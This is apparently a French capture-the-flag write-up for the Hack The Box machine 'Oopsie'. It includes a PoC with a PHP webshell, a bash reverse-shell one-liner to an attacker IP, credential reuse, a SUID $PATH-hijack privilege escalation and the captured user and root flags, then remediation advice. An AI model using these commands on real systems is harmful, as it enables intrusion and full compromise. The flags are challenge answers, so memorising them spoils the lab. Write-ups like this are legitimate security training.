# HTB — Oopsie

> **Difficulté :** Very Easy **OS :** Linux **IP :** `10.129.95.191` **Date :** 12/10/2026

---

## Description

La machine héberge un site web (MegaCorp Automotive) avec un back-office caché sous `/cdn-cgi/login/` et une fonctionnalité d'upload de fichiers destinée à ajouter des images d'inventaire. L'application ne valide pas correctement le type des fichiers uploadés, ce qui permet de déposer un script PHP arbitraire sur le serveur et d'obtenir l'exécution de code côté serveur (RCE). Une fois un accès initial obtenu, des identifiants de base de données exposés en clair dans le code source permettent un mouvement latéral vers un second utilisateur, qui dispose d'un accès à un binaire SUID root mal sécurisé.

---

## Exploitation

1. **Reconnaissance** Scan Nmap révélant deux services exposés :
   - Port 22 (SSH)
   - Port 80 (HTTP)

   Énumération web du site MegaCorp Automotive, découverte d'un répertoire non standard `/cdn-cgi/login/` contenant une interface d'administration (`index.php`, `admin.php`, `db.php`).
2. **Découverte de la vulnérabilité** L'interface d'administration donne accès à une fonctionnalité d'upload de fichiers (ajout d'images pour l'inventaire véhicules) sous `/uploads/`. Le contrôle du type de fichier côté serveur est insuffisant, permettant l'upload d'un fichier `.php` au lieu d'une image.
3. **Exploitation — accès initial** Upload d'un webshell PHP (`shell.php`) exécutant des commandes système via un paramètre GET (`?cmd=`). Mise en place d'un reverse shell :
   - Démarrage d'un listener `nc -lvnp 4444` sur la machine attaquante.
   - Déclenchement du reverse shell via le webshell uploadé, obtenant un accès `www-data`.

   Stabilisation du shell via PTY Python pour permettre les interactions type `su`.
4. **Élévation de privilèges — mouvement latéral (`www-data` → `robert`)** Lecture du code source de l'application : `/var/www/html/cdn-cgi/login/db.php` contient des identifiants MySQL en clair pour l'utilisateur `robert` (`M3g4C0rpUs3r!`), réutilisés avec succès pour une authentification système via `su robert`.
5. **Élévation de privilèges — robert → root** `robert` appartient au groupe `bugtracker`, correspondant à un binaire SUID root (`-rwsr-xr-- root bugtracker /usr/bin/bugtracker`). L'analyse du binaire avec `strings` révèle qu'il appelle la commande `cat /root/reports/...` **sans chemin absolu**. Le binaire demande un "Bug ID" puis exécute cette commande via la fonction `system()`.

   Comme `cat` est appelé sans chemin absolu, il est possible de détourner la résolution de `$PATH` : un faux binaire `cat` est placé dans `/tmp`, répertoire ajouté en tête du `$PATH`. Lorsque `bugtracker` (SUID root) exécute `cat`, c'est le faux binaire `/tmp/cat` qui est lancé à la place du vrai — avec les privilèges root hérités du SUID. En plaçant `/bin/bash` dans ce faux `cat`, un shell root est obtenu.

---

## PoC

**Upload et exécution du webshell :**

```bash
# Listener côté attaquant (à lancer AVANT le curl)
nc -lvnp 4444

# Déclenchement du reverse shell via le webshell uploadé
curl "http://10.129.95.191/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP_ATTAQUANT>/4444+0>%261'"
```

**Stabilisation du shell :**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z puis côté attaquant :
# stty raw -echo; fg
export TERM=xterm
```

**Identifiants exposés :**

```http
GET /cdn-cgi/login/db.php
```

```bash
cat /var/www/html/cdn-cgi/login/db.php
# $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');

su robert
# Password: M3g4C0rpUs3r!
```

**Élévation robert → root :**

```bash
# robert appartient au groupe bugtracker
id
# uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

# le binaire est SUID root et réservé au groupe bugtracker
ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker

# strings révèle un appel système sans chemin absolu
strings /usr/bin/bugtracker | grep cat
# cat /root/reports/

# détournement du $PATH : un faux "cat" qui lance un shell
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# déclenchement : bugtracker exécute /tmp/cat au lieu du vrai cat
/usr/bin/bugtracker
# Provide Bug ID: 0

# shell root obtenu — on utilise le vrai cat pour lire le flag
/bin/cat /root/root.txt
# af13b0bee69f8a877c3faf667f7beacf
```

---

## Risk

L'absence de contrôle strict sur les fichiers uploadés permet une exécution de code arbitraire côté serveur (RCE), offrant un accès initial complet à l'attaquant. La présence d'identifiants en clair dans le code source applicatif (`db.php`) permet un mouvement latéral vers un compte utilisateur système légitime. Le binaire SUID root `bugtracker`, qui invoque une commande système sans chemin absolu, permet ensuite une élévation de privilèges triviale par détournement de `$PATH`. La chaîne complète d'exploitation aboutit à une compromission totale de la machine (root), avec accès à l'ensemble des données et services hébergés.

---

## Remediation

- Valider strictement le type MIME et l'extension des fichiers uploadés côté serveur (whitelist, pas blacklist), et stocker les fichiers uploadés hors de la racine web exécutable.
- Ne jamais stocker d'identifiants en clair dans le code source ; utiliser des variables d'environnement ou un gestionnaire de secrets.
- Restreindre les permissions SUID aux seuls binaires strictement nécessaires, et auditer régulièrement les binaires SUID présents sur le système (`find / -perm -4000`).
- Pour tout binaire SUID personnalisé, invoquer les commandes système avec des chemins absolus (`/bin/cat` plutôt que `cat`) afin d'empêcher le détournement de `$PATH`.
- Restreindre l'accès aux interfaces d'administration (`/cdn-cgi/login/`) par IP ou authentification renforcée, et éviter les chemins trompeurs imitant des services tiers (Cloudflare).

---

## Résumé

**Machine :** Oopsie **Vulnérabilité principale :** Upload de fichier non restreint (RCE) + identifiants en clair + SUID mal configuré (détournement de `$PATH`) **Accès initial :** `www-data` via webshell PHP uploadé **Privilèges obtenus :** Root (via `robert` → `bugtracker`)

**Flags :**

- User : `f2c74ee8db7983851ab2a96a44eb7981`
- Root : `af13b0bee69f8a877c3faf667f7beacf`